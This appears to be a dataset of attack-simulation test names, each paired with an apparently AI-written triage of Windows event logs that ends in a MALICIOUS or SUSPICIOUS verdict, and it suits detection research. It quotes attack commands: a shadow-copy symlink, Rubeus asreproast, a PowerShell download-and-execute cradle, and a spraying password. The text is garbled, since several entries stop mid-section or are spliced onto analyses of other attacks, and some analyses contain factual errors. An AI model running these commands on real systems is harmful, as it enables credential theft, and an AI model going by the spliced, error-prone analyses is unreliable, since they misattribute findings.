   - Conduct a detailed forensic analysis of the host, focusing on identifying how the script or commands were initiated. Look for scheduled tasks, scripts, or potentially malicious software that could have facilitated this activity.
   - Review other logs (e.g., PowerShell, Security, Audit logs) if available to correlate activities and pinpoint potential infiltration vectors.

3. **Remediation:**
   - Remediate any identified vulnerabilities that may have facilitated this unauthorized access or command execution. This may include patching or updating software to reduce the attack surface.
   - Reinforce access controls and monitoring, particularly focusing on administrative privileges and sudden surges of quick, automated command executions.

4. **Communication:**
   - Inform stakeholders within the organization, including IT security and management teams, about the findings and the steps being taken to address the issue.
   - Raise awareness among IT staff about similar patterns of attacks and ensure detection mechanisms are in place to flag such activities promptly in the future."
Create Symlink to Volume Shadow Copy,"After analyzing the provided Windows event logs, here is a detailed breakdown of the findings:

**1. System Log (Windows Update Activities):**
   - The Windows Update log entries indicate standard update operations for Microsoft Defender Antivirus. There are no anomalies or signs of tampering.
   
**2. Sysmon Log (Process Creation and Activity):**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the `SERVER002\admin_test` user. These are standard Windows utilities, and their usage in themselves is not suspicious. However, frequent invocations without clear context may necessitate further investigation, especially if unauthorized admin activity is suspected.
   - Usage of `HOSTNAME.EXE` and `WHOAMI.EXE` also appears normal for querying the system and user context.
   - Notably, there is a command execution: `cmd.exe /c vssadmin.exe create shadow /for=C: & mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`. The `vssadmin.exe` utility is used to create shadow copies, which could be a legitimate activity, yet is a known tactic used by ransomware to lock files. The combination of `vssadmin.exe` with `mklink` to create links to shadow copies is an approach that might suggest data access and potential exfiltration or backup without the intention of user access.
   
**3. Security Log (Privilege and Logon Events):**
   - Several Event ID 4672 logs indicate that the `admin_test` user received elevated privileges. These privileges include critical access rights that, if used maliciously, could lead to significant security risks.
   - Event ID 4624 indicates successful logon by `admin_test`. This could tie into observed elevated privilege activity.

**Assessment:**
- **Suspicious Activity:** The combination of shadow copy creation using `vssadmin.exe` and creation of a link via `mklink` stands out as particularly noteworthy. While these can be valid admin tasks, their usage patterns and purposes should be clarified, especially in conjunction with other elevated activities detected in logs.
- Repeated execution of utilities like `wevtutil.exe` should be further investigated to ensure they align with the expected usage for legitimate administrative monitoring or troubleshooting.
  
**Resolution:**
- **SUSPICIOUS -** The observed activities could potentially pose a security risk and need further investigation. Particularly, the `vssadmin.exe` command pattern involving shadow copies and file links is suspicious and warrants a closer examination to rule out malicious intent.
  
**Next Steps:**
1. Verify the intended legitimate purpose for these activities with the user `admin_test` or the responsible IT department.
2. Review system access policies and permissions to ensure that such elevated actions require appropriate oversight.
3. Monitor for any further use of similar command patterns or privilege escalations to identify any unauthorized or malicious activities.

It is essential to approach these findings with caution and ensure that verified conclusions are drawn through further contextual analysis and user verification."
Rubeus asreproast,"### Detailed Analysis:

Upon analyzing the provided Windows event logs from different sources, here are my findings:

#### Suspicious or Anomalous Behavior:

1. **PowerShell Execution**: 
   - There are multiple entries in both the Sysmon and PowerShell logs related to the execution of `powershell.exe` with a specific command-line argument: `cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\"" asreproast /outfile:\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script_output.txt\""`.
   - The presence of command-line parameters for `asreproast` suggests potential credential access attempts. “AS-REP Roasting” is a known attack technique used to extract hashed credentials for offline cracking.
   
2. **Frequent Execution of System Utilities**:
   - There are several instances of `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` being executed by the `SERVER002\admin_test` user.
   - Frequent execution of such utilities can be part of reconnaissance activities.

3. **Use of Temporary and Non-Standard Directories**:
   - Evidence of Microsoft Edge Update-related activities under `C:\\Program Files (x86)\\Microsoft\\Temp\\` are noted. This is atypical, as legitimate updates usually occur in well-known directories. 
   - The specific folder `EU9ACF.tmp` could be used for hosting temporary files for legitimate purposes, but due diligence is required.

4. **Command Line with Suspicious Encoding**:
   - One `MicrosoftEdgeUpdate.exe` process is seen with long command-line arguments that look potentially encoded or obfuscated (`/ping ...`), suggesting non-standard configuration that could be employed for malicious purposes.

#### Indicators of Compromise:

- **Potential Credential Theft Attempt**: The observed PowerShell command involving `asreproast` and the creation of an output file explicitly suggest a credential extraction attempt.
- **Anomalous Use of Admin Account**: The consistent usage of the admin account (`SERVER002\admin_test`) across potentially suspicious activities could suggest unauthorized usage or compromise.

### Assessment:
Given the indicators noted in the logs, several events point towards potential credential theft attempts and misuse of administrative privileges. The execution patterns, especially surrounding PowerShell and specific command-line tools, align with common tactics in penetration tests and cyber-attack procedures.

### Resolution:
**MALICIOUS**: The activities associated with PowerShell execution and `asreproast` strongly indicate malicious intent focused on credential gathering, which is a significant breach risk.

### Guidance:
- **Immediate Action**: Isolate the host `Server002` for further forensic analysis to prevent lateral movement or further compromise.
- **Credential Review**: Conduct a thorough review and reset credentials for `SERVER002\admin_test` and any other potentially impacted accounts.
- **Audit Logs and Alerts**: Enhance monitoring around PowerShell usage and privilege escalation patterns in the environment. Implement stricter logging and alerting mechanisms.
- **Investigate Past Incidents**: Examine historical logs for similar patterns and determine the root cause or initial access vector.

It is imperative to act quickly to mitigate related risks and prevent similar incidents from occurring in the future."
Crafting Active Directory golden tickets with Rubeus,"### Detailed Analysis

Upon reviewing the provided logs, several suspicious activities can be identified, potentially indicating malicious behavior. 

1. **PowerShell Activity (Windows PowerShell Logs):**
   - Multiple entries highlight the execution of a PowerShell script using a combination of cmd.exe, script.exe, and runas.exe. The script seems to manipulate Kerberos tickets, indicating the potential creation and usage of Golden Tickets. The following processes are highlighted:
     - **cmd.exe** running a script with AES encryption, which is often linked with attempts to bypass security controls.
     - **runas.exe** usage with `/netonly`, often used to execute commands with network but not local credentials, a technique that could aid in stealthily maintaining network access or credentials theft.

2. **Execution of Kerberos-related Commands:**
   - The use of `klist purge` and generation of scripts to manipulate and request Kerberos tickets suggest potential abuse of authentication mechanisms, which aligns with T1558.001 (Kerberos Ticket Manipulation) from the MITRE ATT&CK framework.

3. **Sysmon Activity (Event IDs and Process Execution):**
   - Abnormal and non-standard command executions were logged, such as **remove multiple temporary files** and creating a batch file with suspicious Kerberos manipulation commands.
   - High integrity-level processes signal potential privilege escalation attempts.

4. **Security Logs:**
   - Event 4624 and 4672 indicate privileged access being obtained. The presence of multiple high-privilege security attributes (SeSecurityPrivilege, SeTakeOwnershipPrivilege, etc.) associated with `admin_test` suggests escalation or use of privileges consistent with administrative level access.
   - Event 5379 illustrates failed attempts to access or manipulate credentials, often a sign of reconnaissance or attack preparation.

5. **Application Logs (Edge Update Service):**
   - Multiple service stop events for `edgeupdate`, typically indicating potentially adversary actions meant to disrupt update services, possibly to maintain persistence by preventing patching.

### Threats or Risks Identified

Password Cracking with Hashcat,"### Detailed Analysis and Assessment

Upon examining the provided Windows event logs across multiple channels—Security, Application, System, and Sysmon—I have identified several events of interest that may be indicators of suspicious activity.

#### Observations

1. **Security Log Indicators:**
   - Event ID `4672` was triggered multiple times, indicating that special privileges were assigned to the `SYSTEM` account. These privileges include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be concerning if used in an unusual context.
   - Event ID `4798` shows enumeration of local group membership, conducted by the `taskhostw.exe` and `CompatTelRunner.exe` processes. While this can be a normal operation, its frequency and the processes involved warrant further scrutiny.

2. **Sysmon Log Indicators:**
   - The execution of `hashcat.exe`, a well-known password cracking tool, is observed in the Sysmon logs. This process was launched from a temporary directory with a command-line involving `hashcat`, pointing to potential unauthorized attempt to crack hashes, indicating malicious intent.
   - The command-line execution under `admin_test` user context is alarming: `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\hashcat6\\hashcat-6.1.1\\hashcat.exe`.
   - Multiple executions of `wevtutil.exe` are logged, which typically involves the export or manipulation of event logs—an action often associated with attempts to cover tracks.

3. **Process Anomalies:**
   - Processes like `CompatTelRunner.exe` and `taskhostw.exe` executing privilege enumeration and running from unusual contexts emphasize anomalous behavior.

#### Assessment

The logs exhibit activities that align with potential compromise scenarios, particularly involving credential access and lateral movements through privilege escalation. In particular, the use of `hashcat.exe` strongly suggests an attempt at password cracking, which, combined with the execution of system commands under elevated contexts, suggests malicious activity.

### Conclusion

Based on the analysis:

- **Resolution: MALICIOUS**

The presence of password cracking attempts, misuse of privileges, and system processes acting outside typical behavior strongly indicate a malicious scenario. Immediate investigation and response are needed to mitigate possible threats.

### Guidance and Next Steps

#### System Log

1. **Time Change Events**:
   - Multiple events are showing time adjustments on the system:
     - `EventID 24` and `EventID 1` from Microsoft-Windows-Kernel-General show a time change by the svchost.exe process.
     - Event time changed from `2024-10-24 13:46:43.3981963` to `2024-10-24 13:47:05.5595601`.
     - Such activities need validation whether they are related to legitimate time synchronization or administrative actions. Frequent and unexplained time changes could be indicative of tampering.

2. **Time Synchronization Source**:
   - `EventID 35` from Microsoft-Windows-Time-Service indicates a time synchronization with a time source (`time.windows.com`).

#### Security Log

1. **Security Auditing - Time Change**:
   - `EventID 4616` shows logging of a time change performed by `svchost.exe`. This matches the System log entries. The event subject is `LOCAL SERVICE` on `NT AUTHORITY`.

#### Application Log

- No unusual activity is captured in the brief log entry provided, which appears related to software protection.

#### Sysmon Log

1. **Process Execution**:
   - Several instances of common processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `powershell.exe` are seen executed by user `admin_test`.
   - Observations:
     - `wevtutil.exe` and `wevtutil.exe` are often used for legitimate purposes. However, if initiated with unusual frequency or arguments, these could be worrisome.
     - `powershell.exe` command is suspicious. It contains a complex command indicative of a password spraying attack, attempting a default password against user accounts.
     - This specifically looks illegitimate, showing an intent to test known user accounts with a default password (`P@ssw0rd!`).

#### Windows PowerShell Log

- Multiple events showing the start of PowerShell with a suspicious script indicating a potential password spraying attack.

### Assessment

- **Suspicious Activity Detected**:
  - The execution of PowerShell scripts attempting credential validation against a domain using a default password (`P@ssw0rd!`) is highly suspicious and indicative of malicious activity.
  - The routine execution of tools like `wevtutil.exe` without note of additional arguments does not immediately imply malicious behavior but should be observed in broader context.
  - Repeated change of system time is unconventional and suggests further investigation is required to establish the legitimacy of the time adjustment actions.

### Final Resolution

dump volume shadow copy hives with certutil,"After thoroughly reviewing the provided Windows event logs, let's summarize the investigation:

1. **Application Log**: 
   - Only events from the ""Microsoft-Windows-Security-SPP"" provider were present, which relate to the Software Protection Platform Service. These entries do not indicate any suspicious activity or compromise; they are typically benign.

2. **Sysmon Log**: 
   - Multiple instances of process creation and termination are recorded with elevated integrity levels.
   - Notably, there is evidence of the `cmd.exe` being used to execute a script involving `certutil.exe` to encode the SAM file from shadow copies. This behavior is highly suspicious as it indicates someone may be attempting to extract sensitive data such as hashed passwords from the SAM file, a common step in the credential extraction process.
   - `certutil.exe` is often used by attackers to encode or decode files as part of a smuggling operation or data exfiltration.
   - This script cycles through several volume shadow copies indicating a systematic attempt to gather SAM data, which is not typical for legitimate system operations.

3. **Microsoft Edge Update Events**:
   - Several events related to Microsoft Edge Update are shown, indicating a regular update process. These actions were completed under the NT AUTHORITY\SYSTEM user, which does not appear suspicious given the context of a system-level update process. 

**Assessment**:
- The key concern is the batch script executing `certutil.exe` with the goal of reading SAM files from volume shadow copies. This is a clear indication of potentially malicious activity, as it suggests attempts to extract sensitive information that could be used for privilege escalation or lateral movement within the network.

**Resolution**: 
- **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Action**: 
   - Isolate the affected host (Server002) from the network to prevent any lateral movement or further actions by the attacker.
   - Perform a thorough endpoint forensic analysis to identify any further indications of compromise or secondary payloads.
   
2. **Investigate Further**:
   - Examine related logs for signs of successful data exfiltration.
   - Analyze other systems within the network for similar patterns of behavior.

3. **Remediation**:
   - Change all passwords, especially for accounts with administrative privileges.
   - Review and enhance endpoint security posture, such as implementing strict application whitelisting and continuous monitoring.
  
4. **Report**:
   - Document the findings and actions taken in detail to support any follow-up investigations or actions.

The combination of `cmd.exe` with `certutil.exe` targeting the SAM files strongly indicates adversarial activity, justifying the malicious classification. Immediate containment and in-depth analysis are crucial to mitigating any risks associated with this incident."
Dump Credential Manager using keymgr.dll and rundll32.exe,"Upon reviewing the provided Windows event logs, several patterns and events need to be considered in order to determine if there is any suspicious or malicious activity present.

### Logs Analysis:

1. **Privilege Assignment Events (4672)**:
   - Throughout the logs, there are events assigning high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` to the user `admin_test`. While this user might require these privileges in normal operations, it is crucial to verify if this activity was initiated by an authenticated system administrator or scheduled task.

2. **Multiple NTLM Logon Events (4624)**:
   - There are several logon events via NTLM, which are recorded for `admin_test`. The logons are from `DESKTOP-3HL5B2P`. Continuous logon activity might indicate a brute force attempt or a script performing repeated tasks. However, the logons appear legitimate since they use the NTLM v2 protocol, which is secure, assuming the credentials are valid.

3. **Unusual Processes Execution (Sysmon EventID 1 and 5)**:
   - The process executions captured by Sysmon include `wevtutil.exe` and `conhost.exe` under `admin_test`. The usage of `wevtutil.exe` suggests that event logs might have been queried or cleared, which is a common tactic used by threat actors seeking to hide their activity.
   - A PowerShell command: `powershell.exe & {rundll32.exe keymgr,KRShowKeyMgr}` is executed. This specific command is based on a scriptlet attack that can be used to access credential storage in Windows. This is a major indicator of compromise.

4. **PowerShell Logs**:
   - Several events related to PowerShell usage indicate that `rundll32.exe` was executed from a PowerShell session with potential interest in credential management.

5. **HHCTRL Event in Application Log**:
   - The `HHCTRL` event recorded in the application log might seem unrelated to malicious activity directly, but it needs to be contextualized with other events. On its own, it does not seem malicious.

### Conclusion:

- The identified usage of wevtutil and PowerShell to run a potentially malicious command, combined with the assignment of extensive privileges to `admin_test`, indicates considerable suspicious activity.
- The command leveraging `rundll32.exe` to interact with key manager points towards a potential attempt to obtain sensitive information.
- The combination of extensive PowerShell activity, privilege escalation, and common hacker tool usage (wevtutil) strongly suggests a coordinated malicious activity.

### Resolution:
- **MALICIOUS**: The logs contain activity indicative of an active compromise, primarily due to the suspicious use of PowerShell to execute commands related to credential management, as well as the potentially suspicious utilization of `wevtutil.exe` to handle logs. Immediate review and response, including potential isolation and scrutiny of `admin_test`, is advised to mitigate ongoing risks."
WinPwn - Loot local Credentials - mimi-kittenz,"After analyzing the provided Windows event logs, the following observations and conclusions have been made:

### System Log Analysis:
1. **Time Changes**: Several time changes are recorded close to each other, executed by the `svchost.exe` process, which is a legitimate Windows process. However, repeated system time adjustments can sometimes indicate an attempt to manipulate log records or system events. In this context, more investigation may be needed to determine the reason for these adjustments. 

2. **Kernel-General Events**: No anomalous behavior detected in these Kernel-General event IDs (1, 24). These can sometimes reflect normal operations during system updates or time synchronization.

### Application Log Analysis:
1. **Security Products**: Logs indicate that Windows Defender was active, which is a benign state showing active security measures.

2. **Edge Update**: The stopping of the `edgeupdate` service appears routine and typically benign, reflecting software update processes.

### PowerShell Log Analysis:
1. **PowerShell Script Execution**: There is evidence of a PowerShell script being executed which downloads and runs a script from an external GitHub URL. This operation is highly suspicious, especially given the obfuscation-like behavior (`iex(new-object net.webclient).downloadstring(...)` indicates downloading and executing code directly from the Internet). It's definitely worth further investigation to understand the script's intention and to ensure it hasn't compromised the system. 

### Sysmon Log Analysis:
1. **Frequent Execution of Host Utilities**: The frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the user `SERVER002\admin_test` is not inherently malicious but can form part of a reconnaissance activity, especially when seen alongside suspicious PowerShell commands. 

2. **Process Executions**: The execution of `hostname.exe` and its relations documented in these logs look benign as these are standard operations/processes. However, given the PowerShell activity, the context around their usage should be reviewed.

### Security Log Analysis:
1. **Time Auditing**: Reiterates the system time modifications with legitimate references (`svchost.exe`), but these should be cross-examined in any other context of administrative activities or changes.

### Conclusion:
The key event that stands out is the PowerShell activity, which involves downloading and executing scripts from an external source. This behavior is often associated with malicious activities like downloading malicious payloads or executing unauthorized commands, thus posing a security risk.

### Resolution:
**SUSPICIOUS**

Further investigation is needed into:
- The source and content of the PowerShell scripts executed, especially around the GitHub URL accessed.
- A thorough review of any associated changes or anomalies around times when the scripts ran.
- Reviewing the intent behind the repeated time change events and any deviations in logging or event generation following these.

### Recommended Action:
- Isolate the host for a detailed forensic investigation.
- Inspect PowerShell logs in greater detail for any further execution of unauthorized scripts.
- Validate the integrity and authenticity of the scripts downloaded via GitHub.
- Verify if there were any unauthorized changes made to critical system files or user accounts during these event times."
WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,"Upon reviewing the provided log entries, the analysis reveals the following notable elements across different log files:

1. **Security Log:**
   - The series of EventID 5379 entries indicate an attempt to read credentials with a return code 3221226021. This return code suggests ""Access Denied"" errors, which could be non-malicious if an application or a service is simply failing to access a resource it doesn't have permission for. However, multiple attempts focusing on a MicrosoftAccount and WindowsLive serviceuri raises concerns about potential brute force attacks or unauthorised script attempts to access sensitive information.

2. **Windows PowerShell Log:**
   - The Windows PowerShell logs show PowerShell sessions attempting to execute a downloaded script from a remote GitHub repository using `iex(new-object net.webclient).downloadstring(...)`. This behavior is highly suspicious as it indicates a potential unauthorized script execution. The command to download and execute a script over the network is a known tactic used in malicious activities, such as when leveraging PowerShell for fileless malware attacks.

3. **Sysmon Log:**
   - The Sysmon entries record multiple executions of commands and programs (such as `whoami.exe`, `hostname.exe`, `wevtutil.exe`) under the `admin_test` user. While individually, these programs can be used for legitimate purposes, they can also be part of post-exploitation activities used to gather system information and manipulate event logs.
   - Notably, the presence of `wgetutil.exe` shortly before the PowerShell events could imply efforts to manipulate event logs, although such activity is not conclusively proven here.

4. **Application and System Logs:**
   - Logs show normal activity for Windows Defender updating signatures and Microsoft Edge Update, which stand in as routine, benign activities.

**Assessment and Conclusion:**

- **Suspicious Activity Detected:** 
  - The PowerShell commands downloading and executing scripts off the internet align with activities often seen in malicious scenarios such as unauthorized remote script execution or fileless malware. 
  - The failed credential access attempts, while possibly non-malicious on their own, in conjunction with suspicious script activity, heightens the concern.

**Resolution: SUSPICIOUS**

There is evidence of suspicious activity that merits further investigation. The PowerShell activity is particularly concerning and suggests possible compromise or an attempt thereof. It is recommended to:

- Quarantine the affected host immediately for further forensic investigation.
- Analyze the retrieved PowerShell script from the URL to understand its intent.
- Review network logs for outgoing connections that could be part of data exfiltration.
- Implement enhanced monitoring on the user's account (`admin_test`) and any associated systems.
- Check for any additional unauthorized users' activity or modifications during the period in question. 

Ensure the incident response team is aware to handle any additional threats detected and to conduct a comprehensive review of system configurations and access policies to prevent future incidents."
Simulating access to Windows Edge Login Data,"Upon review of the provided log entries, we can evaluate any suspicious or potential malicious activity as follows:

### Suspicious Activity:

1. **PowerShell Execution:**
   - The logs show multiple instances of PowerShell executing with a specific command to copy Microsoft Edge User Data from one directory to another using the `Copy-Item` command. The command executed is:
     ```
     Copy-Item ""$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Edge"" -Force -Recurse
     ```
   - Copying browser data to another location can indicate potential data exfiltration or malicious data staging, especially since it's directed to a potentially suspicious path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Edge`).

2. **Sysmon Logs:**
   - Multiple executions of Windows native utilities like `wevtutil.exe`, `wsmprovhost.exe`, and frequent `conhost.exe` processes aligned with PowerShell usage could suggest attempts at either event log tampering or performing operations that operate through command-line interfaces.
   - The user `SERVER002\\admin_test` executed processes with a high integrity level, potentially indicating elevated privileges.

3. **Network and System Services:**
   - System level processes such as `sppsvc.exe` and `WmiPrvSE.exe` run by `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM` are also shown as executing. Though these can be normal, they need to be corroborated with the system's expected behavior for any unexplained activities.

### Threat Assessment:
- The consistent use of PowerShell with data copying in the command line coupled with the high frequency of system tool usage might suggest some level of scripting activity that could align with a scripted or automated task being set up with possible malicious intent. This tactic is often seen in multi-stage attacks where initial data collection is performed.

### Resolution:
Based on the above analysis, the observed behavior is marked as **SUSPICIOUS**. The PowerShell operation suggests data manipulation activities that deviate from normal user activity, which warrants further investigation into whether this action was legitimate and part of a planned administrative task, or if it's unauthorized and indicative of a larger compromise or planned data exfiltration.

### Recommended Actions:
- **Deep Dive Investigation:** Conduct a deeper investigation into the context of the PowerShell command execution - who initiated it and why.
- **User Validation:** Check into the user `admin_test` related activities, their recent access logs, and any anomalies related to their sessions.
- **Audit Logs Review:** Scrutinize other related Windows logs to discern if there are any additional signs of unauthorized access or data staging.
- **Endpoint Monitoring:** Ensure that endpoint detection systems are updated to catch any related anomalous or potentially harmful commands or data movements.
- **Security Policy Enforcement:** Review corporate policies on PowerShell and scripting usage on servers and enforce stricter controls if necessary."
PowerDump Hashes and Usernames from Registry,"### Analysis of Logs

In reviewing the provided Windows event logs, several details and patterns stand out:

1. **System Log:**
   - The logs show regular updates being applied by the Microsoft-Windows-WindowsUpdateClient for Microsoft Defender Antivirus. These actions seem to be part of a routine update process and do not exhibit any unusual or malicious indicators.

2. **Sysmon Log:**
   - Usage of `powershell.exe` with a suspicious command line, which includes disabling Microsoft Defender Realtime Monitoring and using a potentially malicious script `PowerDump.ps1`. This is a strong indicator of malicious activity. PowerShell is often used by adversaries to execute malicious payloads or scripts (disturbingly, here it is being used to disable security features).
   - The execution of `wevtutil.exe` by `admin_test`. While `wevtutil.exe` itself is a legitimate Windows utility used for managing event logs, frequent or unexplained usage of it, especially in conjunction with suspicious activities, can be a red flag.
   - Frequent occurrence of `conhost.exe` likely accompanying CLI-based activities, but no immediate signs of being used maliciously given the context.

3. **PowerShell Log:**
   - Shows execution of PowerShell commands aiming to set execution policy bypasses and disable Defender's real-time monitoring, tied to `PowerDump.ps1`. These actions are commonly used in malicious PowerShell activities to carry out unauthorized changes.

4. **Application Log:**
   - Repeated confirmations that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This would generally imply that Defender's real-time protection remains enabled, which conflicts with the intent in the PowerShell events.

### Assessment

The logs exhibit a **definite sign of malicious activity** particularly centered on the PowerShell logs which highlight unauthorized execution of potentially harmful scripts aimed at disabling Defender's security features. Given the significant impact of these actions on system security, there are clear indicators of attempted compromise.

### Resolution

**MALICIOUS**

### Guidance on How to Proceed

#### Observations:

1. **Registry Query via CMD**:
   - **EventID 1**: Execution of `cmd.exe` to run a registry query (using `reg.exe`) to check for the ProductType, specifically searching for `LanmanNT`, which is associated with domain controllers.
   - **Suspicion**: While querying registry keys is common, queries targeting domain controller identifiers (`LanmanNT`) can be indicative of reconnaissance activities, potentially by a malicious actor determining the role of the machine.

2. **Execution of `ntdsutil` Command**:
   - **EventID 1**: Launch of `cmd.exe` with the command-line argument involving `ntdsutil`. This tool is used for managing Active Directory. The creation of IFM (Install From Media) is a task often performed for setting up domain controllers or for backups.
   - **Suspicion**: This action can be benign if performed by an admin during legitimate administrative activities but can also indicate potential data exfiltration or unauthorized dumping of Active Directory data if unexpected.

3. **Processes Executed with High Integrity**:
   - Several processes (e.g., `wevtutil.exe`, `findstr.exe`, `conhost.exe`) executed with high integrity under `SERVER002\admin_test` and NT AUTHORITY\SYSTEM. While common, scrutiny should be maintained on the integrity level of unexpected processes or user accounts.

4. **Use of `whoami.exe` and `hostname.exe`**:
   - **EventID 1**: These commands are frequently used during initial reconnaissance by attackers post-compromise to gather information about the current user and machine.
   - **Suspicion**: Considered suspicious if there is no trace of legitimate user activity aligning with this timeframe or if the user context is infrequent.

5. **Security Intelligence Update and Process Creation**:
   - Security logs indicate regular update activities related to Microsoft Defender Antivirus. Updates are usually benign unless unusual patterns such as modifications or disablement of updates are detected, which is not observed here.

6. **System Activity Analysis**:
   - The system logs highlight regular update processes (`wuauclt.exe`, `MpSigStub.exe`, `AM_Delta.exe`) showing updating anti-malware definitions without unusual alterations or modifications indicative of tampering.
   
7. **Failed Credential Access**:
   - Multiple EventID 5379 entries in the Security Log indicating failed credential queries from Microsoft Account services, which may signify failed attempts to retrieve stored credentials, possibly an indication of suspicious behavior.

#### Assessment:

- **Suspicious Activities**: The usage of `reg.exe` targeting domain controller indicators and `ntdsutil` could represent an account probing domain-related changes or responsibilities. In absence of corroborating actions or user approval, it suggests suspicious activities.
- **Credential Attempts**: Failed credential access attempts observed in the security logs can indicate probing attempts, although the return codes here suggest no credential retrieval.

#### Conclusion:
- **Resolution**: **SUSPICIOUS**

The activities involving registry querying for `LanmanNT`, use of `ntdsutil`, and failed credential access suggest behavior that deviates from standard operations and warrants further investigation. It's critical to confirm whether these operations have been authorized and align with known administrative tasks. If deemed unauthorized, this may indicate a potential incident requiring escalation and containment actions.

### Guidance on How to Proceed:
1. **Verify Administrative Actions**: Confirm with active administrators if the use of `ntdsutil` and registry queries were legitimate and part of planned operations.
2. **User Context Examination**: Investigate the `admin_test` account activity during this window. Was it compromised, or was someone misusing legitimate access?
3. **Deep Dive on Registry Edits**: Review registry access and modifications for signs of configuration changes or tampering.
4. **Enhanced Monitoring**: Set up alerting for future occurrences of similar commands indicative of reconnaissance or Active Directory database access.
5. **Evaluate Network Traffic**: Check for unusual or unauthorized data transfers that may align with the potential repository copy attempts using `ntdsutil`."
Decrypt Mozilla Passwords with Firepwd.py,"Upon reviewing the provided Windows event logs, here is a detailed analysis focusing on potential malicious activities:

### Analysis:

#### 1. **PowerShell Logs:**
- The PowerShell logs show the execution of a script which accesses the Firefox profile directory and executes a Python script with potential data exfiltration: 
  - `powershell.exe & { $PasswordDBLocation = get-childitem -path ""$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"" ... }`
  
  - The PowerShell command executed involves accessing Firefox profiles, possibly for password or sensitive data extraction.
  - The involvement of `cmd /c` to run a Python script that has an output redirected to a temp file (`data.003Test8.txt`) could indicate malicious intent, especially as it attempts to access sensitive data locations.

This behavior is suspicious and aligns with common tactics used in PowerShell exploitation, where adversaries attempt to access browser profile directories to extract user data.

#### 2. **Sysmon Logs:**
- Multiple instances of `conhost.exe`, `wevtutil.exe`, and other processes like `powershell.exe` running under the context of `SERVER002\\admin_test`. 
- Significant because:
  - `wevtutil.exe` can be used to clear Windows event logs, which can be indicative of an attempt to hide tracks after performing unauthorized actions.
  - The sequence of events including PowerShell and file access by command line suggests potential usage of scripting for automation of malicious tasks, often seen in lateral movements and data exfiltration scenarios.

#### 3. **Application Logs:**
- Successful installation of Python 3 indicates the presence of a Python environment on the system. This may have been used to facilitate executing scripts potentially related to the observed activities.
- No direct indication of malicious installations, but the presence of Python aligns with script-based malicious activities.

### Assessment:

- **Suspicious Actions:** 
  - The command execution history and file activities indicate potential malicious actions, focusing on data located within the Firefox profile directory typically associated with user credentials and sensitive information.

### Resolution Based on Findings:

   - **Registry Export Commands:** Following `cmd.exe`, multiple `reg.exe` processes attempt to perform registry exports under a high integrity level, pointing towards potential data exfiltration or unauthorized configuration changes.
   - **Malicious Patterns or Anomalies:** There are frequent executions of standard utilities which could be leveraged in scripting attacks or for gathering system/network information if initiated automatically or without valid administrative intents.

3. **Unauthorized Credential Access Attempts:**
   - Several logs indicate unsuccessful attempts to access credentials linked to a Microsoft Account, though unsuccessful (ReturnCode: 3221226021 indicates a failed operation). These attempts could highlight an exploration phase or automated attempts to breach credentials.

### Assessment:
Based on the above observations, particularly focusing on:
- The `cmd.exe` commands accessing and exporting critical registry hives
- Unsuccessful credential access attempts

The situation is marked as **SUSPICIOUS**. There is no definitive proof of direct malicious activity, but the actions logged could qualify as precursor steps to compromise. Further detailed investigation is requisite to confirm intentions and initiate remediation if needed.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Investigate the source and intent of the command(s) executed to export registry data. Verify if authorized and necessary.

Registry parse with pypykatz,"Upon reviewing the event logs provided, the majority of entries pertain to the installation and execution of Python 3.10.4 and related components on a server identified as Server002. This kind of activity is typically not inherently malicious, but there are certain aspects that should be scrutinized for abnormality or potential misuse. Below is a detailed breakdown of the analysis:

### Application Logs
- **MsiInstaller Events**: These logs indicate that Python 3.10.4 was installed successfully on the server. The events reference the installation of Python executables (pip, Add to Path) and reflect typical package installation activities, with no immediate signs of tampering or unauthorized modifications.

### Sysmon Logs
- **Process Creations**: Multiple sysmon events describe process creations, including `msiexec.exe`, `python.exe`, and `cmd.exe`. Notably:
  - The `cmd.exe` process is executing a command to run a script from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\venv_data_002\\Scripts\\script live lsa`). This is suspicious because command-line executions from temporary directories can sometimes indicate malicious activity, especially with parameters that might be accessing or manipulating sensitive data.
  - PowerShell was used to download software directly from the internet (`https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe`) and execute it. While downloading Python from a legitimate source like python.org is not inherently suspicious, the sequence of download and silent execution (with `-Wait` argument) can be interpreted as a red flag if not expected in routine operations.

### PowerShell Logs
- **PowerShell Script Execution**: The execution of a PowerShell command to download a Python setup executable from the Python official site points to typical software installation. However, the automation of these steps using potentially obfuscated paths (**`..\\Externalfiles\\`**) aligns with practices seen in automated or potentially harmful scripts.

### Observations and Concerns
- The overall actions regarding Python installation and management appear benign if part of intended administrative tasks or software deployment by IT personnel. However, the unprompted creation of scripts and execution from temporary directories are concerning without proper context.
- The invocation of system utilities such as `whoami.exe` and querying user information suggests user context checks, which could imply an automated process checking for certain user permissions or environment setups typically seen in reconnaissance stages of cyber attacks.

### Conclusion and Resolution
This investigation results in a **SUSPICIOUS** conclusion. The activity involving the installation of Python and related tools matches legitimate software use cases, assuming the context. However, the use of `cmd` and `PowerShell` to download and execute from temporary storage, especially when including file paths with parent directory references (`..\\`), mandates further examination.

### Recommendations
